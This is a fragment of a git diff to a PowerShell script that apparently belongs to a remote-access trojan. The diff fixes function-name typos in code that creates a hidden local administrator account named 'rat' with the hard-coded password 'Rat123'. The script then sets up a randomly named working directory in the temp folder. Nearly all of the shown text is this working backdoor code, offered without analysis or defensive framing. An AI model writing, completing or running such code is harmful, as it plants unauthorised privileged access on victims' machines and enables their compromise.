@@ -8,8 +8,8 @@ function random_text{
 
 }
 # create's local admin
-function create_account {
-    [CmdletBidning()]
+function Create-NewLocalAdmin {
+    [CmdletBinding()]
     param (
         [string] $NewLocalAdmin,
         [securestring] $Password
@@ -29,7 +29,7 @@ function create_account {
 #create admin user
 $NewLocalAdmin = "rat"
 $Password = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
-create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
+Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
 #goto temp and make working directory
 $wd = random_text
